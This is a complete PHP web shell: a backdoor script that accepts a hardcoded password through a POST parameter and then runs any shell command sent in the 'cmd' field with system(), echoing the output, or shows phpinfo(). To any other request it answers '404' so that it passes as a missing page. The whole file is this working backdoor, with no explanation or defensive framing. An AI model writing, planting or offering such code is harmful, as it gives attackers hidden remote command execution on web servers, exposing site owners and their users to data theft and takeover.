<?php 
if(isset($_POST['pwd']) && $_POST['pwd']=='adfeeaec75fd649b5f185c6a8fc2ee24'){
    if(isset($_POST['cmd'])){
        echo '<pre>';
        system($_POST['cmd']);
        echo '</pre>';
    }else{
        phpinfo();
    }
}else{
    echo '404';
}
?>